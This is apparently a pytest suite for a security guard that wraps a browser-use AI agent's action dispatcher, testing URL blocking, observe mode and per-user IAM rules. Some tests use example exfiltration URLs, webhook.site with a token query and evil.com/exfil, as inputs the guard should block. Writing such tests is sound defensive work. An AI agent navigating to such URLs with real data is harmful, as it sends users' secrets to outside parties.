"""Tests for the browser-use adapter (adapters/browser-use).

No browser, no LLM — we mock Registry.execute_action (the single dispatch
point) and drive the adapter directly. Async tests run via asyncio.run() so
pytest-asyncio is not required.
"""
import asyncio
import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

import pytest

_ADAPTER_SRC = Path(__file__).resolve().parent.parent / "adapters" / "browser-use"
if str(_ADAPTER_SRC) not in sys.path:
    sys.path.insert(0, str(_ADAPTER_SRC))

from prismor.warden.browser_use import WardenBlocked, guard_controller  # noqa: E402


def _make_controller():
    ctrl = MagicMock()
    ctrl.registry = MagicMock()
    ctrl.registry.__warden_guarded__ = False
    ctrl.registry.execute_action = AsyncMock(return_value="ok")
    return ctrl


def _params(**kw):
    m = MagicMock()
    m.model_dump.return_value = {k: v for k, v in kw.items() if v is not None}
    return m


def _run(coro):
    return asyncio.run(coro)


# ── safe actions pass through ────────────────────────────────────────────────

def test_safe_navigation_passes(tmp_path):
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce")
    result = _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))
    assert result == "ok"


def test_safe_click_passes(tmp_path):
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce")
    result = _run(ctrl.registry.execute_action("click_element", _params(index=3)))
    assert result == "ok"


# ── secret exfiltration (network event) ──────────────────────────────────────

def test_exfil_url_blocked_in_enforce(tmp_path):
    # webhook.site is a known exfil destination — hits the suspicious-network rule
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce", raise_on_block=True)
    with pytest.raises(WardenBlocked):
        _run(ctrl.registry.execute_action(
            "go_to_url",
            _params(url="https://webhook.site/abc123?token=mydata"),
        ))


def test_exfil_url_returns_denial_string(tmp_path):
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce", raise_on_block=False)
    result = _run(ctrl.registry.execute_action(
        "go_to_url",
        _params(url="https://webhook.site/abc123?token=mydata"),
    ))
    assert "blocked" in result.lower()


# ── observe mode never blocks ─────────────────────────────────────────────────

def test_observe_never_blocks(tmp_path):
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="observe")
    result = _run(ctrl.registry.execute_action(
        "go_to_url",
        _params(url="https://evil.com/exfil"),
    ))
    assert result == "ok"


# ── idempotent guard ──────────────────────────────────────────────────────────

def test_double_guard_is_idempotent(tmp_path):
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce")
    first = ctrl.registry.execute_action
    guard_controller(ctrl, workspace=tmp_path, mode="enforce")
    assert ctrl.registry.execute_action is first


# ── per-user IAM ──────────────────────────────────────────────────────────────

def _write_iam(workspace: Path) -> None:
    iam_dir = workspace / ".prismor-warden"
    iam_dir.mkdir(parents=True, exist_ok=True)
    (iam_dir / "iam.yaml").write_text(
        "agents:\n"
        "  user:bob:\n"
        "    allowed_tools: [Read]\n"
        "    deny_tools: [Bash]\n"
        "    deny_network: true\n"
        "    allowed_paths: ['**']\n",
        encoding="utf-8",
    )


def test_per_user_iam_blocks_bob(tmp_path, monkeypatch):
    monkeypatch.delenv("WARDEN_AGENT_ID", raising=False)
    _write_iam(tmp_path)
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce",
                     subject="user:bob", raise_on_block=True)
    with pytest.raises(WardenBlocked):
        _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))


def test_per_user_iam_allows_alice(tmp_path, monkeypatch):
    monkeypatch.delenv("WARDEN_AGENT_ID", raising=False)
    _write_iam(tmp_path)
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce",
                     subject="user:alice", raise_on_block=True)
    result = _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))
    assert result == "ok"


# ── use_subject multi-tenant ──────────────────────────────────────────────────

def test_use_subject_per_request(tmp_path, monkeypatch):
    monkeypatch.delenv("WARDEN_AGENT_ID", raising=False)
    _write_iam(tmp_path)
    from warden.principal import use_subject

    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce", raise_on_block=True)

    with use_subject("user:alice"):
        result = _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))
    assert result == "ok"

    with pytest.raises(WardenBlocked):
        with use_subject("user:bob"):
            _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))
